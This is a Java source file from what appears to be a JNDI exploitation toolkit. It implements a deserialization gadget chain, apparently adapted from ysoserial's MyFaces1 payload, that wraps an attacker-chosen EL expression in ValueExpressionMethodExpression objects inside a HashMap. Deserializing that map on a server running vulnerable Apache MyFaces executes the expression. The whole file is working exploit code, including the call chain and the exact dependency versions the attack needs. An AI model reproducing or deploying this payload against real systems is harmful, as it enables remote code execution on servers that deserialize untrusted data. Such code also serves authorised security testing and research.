package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;

import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.myfaces.context.servlet.FacesContextImpl;
import org.apache.myfaces.context.servlet.FacesContextImplBase;
import org.apache.myfaces.el.CompositeELResolver;
import org.apache.myfaces.el.unified.FacesELContext;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

/**
 * ValueExpressionImpl.getValue(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression(ELContext)
 * ValueExpressionMethodExpression.getMethodExpression()
 * ValueExpressionMethodExpression.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 * <p>
 * Arguments:
 * - an EL expression to execute
 * <p>
 * Requires:
 * - MyFaces
 * - Matching EL impl (setup POM deps accordingly, so that the ValueExpression can be deserialized)
 *
 * @author mbechler
 */
@Dependencies
@Authors({Authors.MBECHLER})
public class myfaces1 implements ObjectPayload<Object>, DynamicDependencies{
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        return makeExpressionPayload(param[0]);
    }

    public static String[] getDependencies() {
        if (System.getProperty("el") == null || "apache".equals(System.getProperty("el"))) {
            return new String[]{
                    "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
                    "org.mortbay.jasper:apache-el:8.0.27",
                    "javax.servlet:javax.servlet-api:3.1.0",

                    // deps for mocking the FacesContext
                    "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
            };
        } else if ("juel".equals(System.getProperty("el"))) {
            return new String[]{
                    "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
                    "de.odysseus.juel:juel-impl:2.2.7", "de.odysseus.juel:juel-api:2.2.7",
                    "javax.servlet:javax.servlet-api:3.1.0",

                    // deps for mocking the FacesContext
                    "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
            };
        }

        throw new IllegalArgumentException("Invalid el type " + System.getProperty("el"));
    }

    public static Object makeExpressionPayload(String expr) throws Exception {
        FacesContextImpl fc        = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
        ELContext        elContext = new FacesELContext(new CompositeELResolver(), fc);
        Reflections.getField(FacesContextImplBase.class, "_elContext").set(fc, elContext);
        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();

        ValueExpression                 ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);
        ValueExpressionMethodExpression e   = new ValueExpressionMethodExpression(ve1);
        ValueExpression                 ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class);
        ValueExpressionMethodExpression e2  = new ValueExpressionMethodExpression(ve2);

        return Gadgets.makeMap(e2, e);
    }
}
